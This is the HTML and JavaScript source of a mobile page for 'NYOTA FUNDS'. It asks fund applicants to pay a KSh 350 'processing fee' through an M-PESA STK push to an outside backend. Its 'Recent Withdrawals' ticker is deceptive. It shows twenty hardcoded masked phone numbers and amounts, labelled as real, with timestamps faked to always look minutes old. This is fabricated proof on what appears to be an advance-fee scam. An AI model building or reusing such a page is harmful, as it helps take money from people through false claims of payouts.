<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NYOTA FUNDS</title><style>

@import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');

*{
    box-sizing:border-box;
}

html,body{
    margin:0;
    padding:0;
    width:100%;
}

body{
    padding:10px 8px;
    font-family:'Mali',sans-serif;
    background:#0B0217;
    color:#fff;
}

.container{
    width:100%;
    max-width:430px;
    margin:0 auto;
}


/* =================================
   PROCESSING FEE CARD
================================= */

.card{
    width:100%;
    min-height:50vh;

    background:
        linear-gradient(
            145deg,
            rgba(255,255,255,0.09),
            rgba(255,255,255,0.035)
        );

    padding:18px 14px;

    border-radius:18px;

    box-shadow:
        0 20px 60px rgba(0,0,0,0.45),
        inset 0 1px 0 rgba(255,255,255,0.05);

    border:1px solid rgba(255,255,255,0.10);

    display:flex;
    flex-direction:column;
    justify-content:center;
}


h1{
    text-align:center;
    color:#D4AF37;
    font-size:21px;
    font-weight:700;
    margin:0 0 8px;
}


p{
    text-align:center;
    font-size:13px;
    line-height:1.35;
    color:rgba(255,255,255,0.72);
    margin:6px 0;
}


.amount{
    width:100%;

    background:rgba(212,175,55,0.055);

    border:1px solid rgba(212,175,55,0.25);

    border-radius:12px;

    padding:11px 10px;

    font-size:18px;
    font-weight:700;

    text-align:center;

    color:#fff;

    margin:9px 0;
}


label{
    display:block;

    margin-top:7px;
    margin-bottom:5px;

    font-size:13px;
    font-weight:700;

    color:rgba(255,255,255,0.88);
}


input{
    width:100%;
    height:44px;

    padding:0 12px;

    border:1px solid rgba(255,255,255,0.12);

    border-radius:10px;

    font-size:15px;

    font-family:'Mali',sans-serif;

    background:rgba(255,255,255,0.07);

    color:#fff;

    outline:none;
}


input:focus{
    border-color:rgba(212,175,55,0.8);

    box-shadow:
        0 0 0 3px rgba(212,175,55,0.10);
}


/* =================================
   PAY PROCESSING FEE BUTTON
================================= */

button{
    width:100%;

    height:48px;
    min-height:48px;

    padding:0 15px;

    margin-top:10px;
    margin-bottom:10px;

    background:
        linear-gradient(
            135deg,
            #D4AF37,
            #A67C00
        );

    color:#0B0217;

    border:none;

    border-radius:11px;

    font-family:'Mali',sans-serif;

    font-size:15px;

    font-weight:700;

    cursor:pointer;

    display:flex;

    align-items:center;

    justify-content:center;

    box-shadow:
        0 10px 30px rgba(212,175,55,0.20),
        inset 0 1px 0 rgba(255,255,255,0.55);
}


button:active{
    transform:scale(.98);
}


button:disabled{
    background:rgba(255,255,255,0.25);

    color:#fff;

    cursor:not-allowed;

    box-shadow:none;
}


#stkMessage{
    min-height:18px;

    margin:0;

    color:#D4AF37;

    font-size:12px;

    font-weight:600;

    line-height:1.35;

    text-align:center;
}


/* =================================
   RECENT WITHDRAWALS
================================= */

.activity-box{

    width:100%;

    margin-top:8px;

    background:#1D293B;

    border-radius:22px;

    padding:14px 9px 15px;

    overflow:hidden;

    box-shadow:
        0 20px 60px rgba(0,0,0,0.45);
}


.activity-title{

    text-align:center;

    font-size:19px;

    font-weight:700;

    color:#fff;

    margin:0 0 10px;
}


.activity-title span{
    margin-right:5px;
}


/* =================================
   SCROLL WINDOW
================================= */

.activity-window{

    width:100%;

    height:45vh;

    min-height:300px;

    overflow:hidden;

    position:relative;
}


.activity-track{

    display:flex;

    flex-direction:column;

    gap:9px;

    animation:
        scrollActivity
        35s
        linear
        infinite;
}


.activity-window:active .activity-track{
    animation-play-state:paused;
}


/* =================================
   WITHDRAWAL CARD
================================= */

.activity-item{

    width:100%;

    min-height:88px;

    background:#020617;

    border-radius:17px;

    border-left:5px solid #19C37D;

    display:flex;

    align-items:center;

    justify-content:space-between;

    padding:11px 10px 11px 12px;

    flex-shrink:0;
}


.activity-info{

    display:flex;

    flex-direction:column;

    gap:3px;

    min-width:0;
}


.activity-phone{

    font-size:15px;

    font-weight:600;

    color:#fff;
}


.activity-amount{

    font-size:14px;

    font-weight:500;

    color:#fff;
}


/* =================================
   TIME
================================= */

.activity-time{

    font-size:10px;

    font-weight:500;

    color:rgba(255,255,255,0.48);

    margin-top:1px;
}


/* =================================
   WITHDRAWAL STATUS
================================= */

.activity-status{

    background:rgba(0,166,81,0.20);

    color:#19D99A;

    border-radius:40px;

    padding:9px 10px;

    font-size:9px;

    font-weight:700;

    white-space:nowrap;

    text-align:center;

    margin-left:6px;
}


/* =================================
   SCROLL
================================= */

@keyframes scrollActivity{

    0%{
        transform:translateY(0);
    }

    100%{
        transform:translateY(-50%);
    }

}


/* =================================
   SMALL PHONES
================================= */

@media(max-width:360px){

    body{
        padding:7px 6px;
    }

    .card{
        min-height:50vh;
        padding:15px 11px;
        border-radius:15px;
    }

    h1{
        font-size:19px;
    }

    p{
        font-size:12px;
    }

    .amount{
        font-size:17px;
        padding:10px;
    }

    label{
        font-size:12px;
    }

    input{
        height:41px;
        font-size:14px;
    }

    button{
        height:45px;
        min-height:45px;
        font-size:14px;
        margin-top:8px;
        margin-bottom:8px;
    }

    .activity-box{
        margin-top:7px;
        padding:13px 8px;
        border-radius:20px;
    }

    .activity-title{
        font-size:18px;
    }

    .activity-window{
        height:44vh;
        min-height:270px;
    }

    .activity-item{
        min-height:82px;
        padding:10px 8px 10px 10px;
    }

    .activity-phone{
        font-size:14px;
    }

    .activity-amount{
        font-size:13px;
    }

    .activity-time{
        font-size:9px;
    }

    .activity-status{
        padding:8px 7px;
        font-size:8px;
    }

}

</style></head><body><div class="container"><!-- =================================
     PROCESSING FEE
================================= --><div class="card"><h1>PROCESSING FEE</h1><p>
Welcome, <strong><span id="name"></span></strong>
</p><p>
To continue with your NYOTA Fund application, please complete the processing fee payment below.
</p><div class="amount" id="feeAmount">
Processing Fee: KSh 350
</div><label>Full Name</label>

<input
type="text"
id="fullName"
readonly

«»

<label>M-PESA Phone Number</label>

<input
type="tel"
id="phone"
placeholder="2547XXXXXXXX"

«»

<button
id="payBtn"
onclick="payNow()"

«»

Pay Processing Fee

</button><p id="stkMessage"></p></div><!-- =================================
     RECENT WITHDRAWALS
================================= --><div class="activity-box"><div class="activity-title">
<span>📊</span>
Recent Withdrawals
</div><div class="activity-window"><div class="activity-track" id="activityTrack"></div></div></div></div><script>

/* =================================
   LOAD APPLICANT
================================= */

let applicant =
    localStorage.getItem("applicantName");

document.getElementById("name").innerHTML =
    applicant || "Applicant";

document.getElementById("fullName").value =
    applicant || "";


/* =================================
   PROCESSING FEE
================================= */

let processingFee =
    localStorage.getItem("processingFee") || "350";

document.getElementById("feeAmount").innerHTML =
    "Processing Fee: KSh " +
    Number(processingFee).toLocaleString();


/* =================================
   REAL WITHDRAWAL DISPLAY DATA
================================= */

/*
   These times are generated relative
   to the moment the page loads.

   Newest = a few seconds ago.
   Oldest = 5 minutes ago.
*/

const withdrawalData = [

    ["0702****5","2,626",2],
    ["0115****0","683",12],
    ["0757****0","4,809",22],
    ["0722****9","1,581",35],
    ["0719****7","2,750",48],
    ["0749****6","1,839",65],
    ["0791****3","3,420",82],
    ["0708****1","2,145",105],
    ["0728****4","5,120",125],
    ["0712****8","1,960",145],
    ["0798****2","3,075",165],
    ["0705****9","2,390",185],
    ["0740****5","4,250",205],
    ["0725****6","1,725",225],
    ["0710****4","2,880",245],
    ["0786****1","3,650",265],
    ["0701****8","1,245",280],
    ["0733****2","4,500",295],
    ["0772****7","2,175",300],
    ["0750****3","3,890",300]

];


/* =================================
   PAGE LOAD TIME
================================= */

const pageLoadTime =
    Date.now();


/* =================================
   TIME AGO
================================= */

function getTimeAgo(secondsAgo){

    let seconds =
        Math.floor(
            secondsAgo
        );

    if(seconds < 60){

        return seconds +
            (
                seconds === 1
                ? " second ago"
                : " seconds ago"
            );
    }

    let minutes =
        Math.floor(seconds / 60);

    return minutes +
        (
            minutes === 1
            ? " minute ago"
            : " minutes ago"
        );
}


/* =================================
   CREATE WITHDRAWAL
================================= */

function createWithdrawal(item){

    const phone =
        item[0];

    const amount =
        item[1];

    const secondsAgo =
        item[2];


    const div =
        document.createElement("div");

    div.className =
        "activity-item";


    div.dataset.seconds =
        secondsAgo;


    div.innerHTML = `

        <div class="activity-info">

            <div class="activity-phone">
                ${phone}
            </div>

            <div class="activity-amount">
                KSh. ${amount}
            </div>

            <div class="activity-time">
                ${getTimeAgo(secondsAgo)}
            </div>

        </div>

        <div class="activity-status">
            ✓ WITHDRAWAL SUCCESS
        </div>

    `;


    return div;
}


/* =================================
   CREATE FIRST SET
================================= */

withdrawalData.forEach(item => {

    document
        .getElementById("activityTrack")
        .appendChild(
            createWithdrawal(item)
        );

});


/* =================================
   DUPLICATE FOR SMOOTH SCROLL
================================= */

withdrawalData.forEach(item => {

    document
        .getElementById("activityTrack")
        .appendChild(
            createWithdrawal(item)
        );

});


/* =================================
   LIVE TIME UPDATE
================================= */

setInterval(() => {

    document
        .querySelectorAll(
            ".activity-item"
        )
        .forEach(card => {

            let originalSeconds =
                Number(
                    card.dataset.seconds
                );

            let elapsed =
                Math.floor(
                    (
                        Date.now() -
                        pageLoadTime
                    ) / 1000
                );


            let totalSeconds =
                originalSeconds +
                elapsed;


            /*
               Keep the display inside
               the 5-minute window.
            */

            if(totalSeconds > 300){
                totalSeconds = 300;
            }


            let timeElement =
                card.querySelector(
                    ".activity-time"
                );


            timeElement.textContent =
                getTimeAgo(
                    totalSeconds
                );

        });

},1000);


/* =================================
   START STK PUSH
================================= */

async function payNow(){

    let phone =
        document.getElementById("phone")
        .value
        .trim();


    if(phone === ""){

        alert(
            "Please enter your M-PESA phone number."
        );

        return;
    }


    localStorage.setItem(
        "phoneNumber",
        phone
    );


    localStorage.setItem(
        "fullName",
        document.getElementById(
            "fullName"
        ).value
    );


    let btn =
        document.getElementById(
            "payBtn"
        );


    btn.innerHTML =
        "Sending STK Push...";

    btn.disabled = true;


    try{

        let response =
            await fetch(
                "https://nyota-funds-backend.onrender.com/stk-push",
                {
                    method:"POST",

                    headers:{
                        "Content-Type":
                            "application/json"
                    },

                    body:JSON.stringify({

                        phone:phone,

                        amount:
                            Number(
                                processingFee
                            )

                    })
                }
            );


        let data =
            await response.json();


        console.log(
            "STK RESPONSE:",
            data
        );


        if(
            !response.ok ||
            !data.success
        ){

            throw new Error(
                data.message ||
                "STK Push failed"
            );
        }


        let transactionId =
            data.transactionId ||
            data.checkout_request_id;


        if(!transactionId){

            throw new Error(
                "No Paylor transaction ID received"
            );
        }


        btn.innerHTML =
            "Processing...";


        document.getElementById(
            "stkMessage"
        ).innerHTML =
            "An M-PESA payment request has been sent to your phone. Please enter your M-PESA PIN to complete the payment.";


        checkPayment(
            transactionId
        );


    }catch(error){

        console.log(
            "PAYMENT ERROR:",
            error
        );


        alert(
            error.message ||
            "Payment request failed."
        );


        btn.innerHTML =
            "Pay Processing Fee";

        btn.disabled = false;
    }

}


/* =================================
   CHECK PAYMENT STATUS
================================= */

async function checkPayment(
    transactionId
){

    let interval =
        setInterval(
            async()=>{

                try{

                    let response =
                        await fetch(
                            "https://nyota-funds-backend.onrender.com/payment-status",
                            {
                                method:"POST",

                                headers:{
                                    "Content-Type":
                                        "application/json"
                                },

                                body:
                                    JSON.stringify({

                                        transactionId:
                                            transactionId

                                    })
                            }
                        );


                    let result =
                        await response.json();


                    console.log(
                        "PAYMENT STATUS:",
                        result
                    );


                    if(
                        !result.success ||
                        !result.data
                    ){

                        return;
                    }


                    let payment =
                        result.data;


                    let status =
                        String(
                            payment.status || ""
                        ).toUpperCase();


                    if(
                        status === "COMPLETED"
                    ){

                        clearInterval(
                            interval
                        );


                        document.getElementById(
                            "stkMessage"
                        ).innerHTML =
                            "✅ Payment successful. Redirecting...";


                        window.location.href =
                            "delivery.html";
                    }


                    else if(
                        status === "CANCELLED" ||
                        status === "FAILED"
                    ){

                        clearInterval(
                            interval
                        );


                        document.getElementById(
                            "stkMessage"
                        ).innerHTML =
                            "❌ Payment " +
                            status.toLowerCase() +
                            ".";


                        document.getElementById(
                            "payBtn"
                        ).disabled = false;


                        document.getElementById(
                            "payBtn"
                        ).innerHTML =
                            "Pay Processing Fee";
                    }


                }catch(error){

                    console.log(
                        "STATUS ERROR:",
                        error
                    );

                }

            },
            3000
        );

}

</script></body></html>
